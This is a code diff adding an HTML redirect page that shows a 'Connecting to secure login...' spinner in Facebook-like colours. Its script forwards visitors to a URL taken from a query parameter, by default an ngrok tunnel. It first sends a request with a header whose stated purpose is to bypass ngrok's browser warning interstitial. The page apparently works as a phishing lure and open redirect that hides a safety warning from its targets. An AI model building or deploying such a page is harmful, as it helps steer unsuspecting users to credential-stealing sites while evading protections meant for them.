@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Redirecting...</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      background: #f0f2f5;
+      font-family: sans-serif;
+      text-align: center;
+    }
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid #ddd;
+      border-top: 4px solid #1877f2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <div class="spinner"></div>
+    <p>Connecting to secure login...</p>
+  </div>
+
+  <script>
+    // Get target URL from query param
+    const url = new URLSearchParams(window.location.search).get('u') || 
+                'https://concentratedly-subcaecal-hunter.ngrok-free.dev';
+
+    // Bypass ngrok warning by sending HEAD request with header
+    fetch(url, {
+      method: 'HEAD',
+      headers: {
+        'ngrok-skip-browser-warning': 'true'
+      }
+    })
+    .then(() => {
+      // Now redirect — ngrok will skip interstitial
+      window.location.href = url;
+    })
+    .catch(() => {
+      // Fallback: direct redirect (may show warning, but rare)
+      window.location.href = url;
+    });
+  </script>
+</body>
+</html>
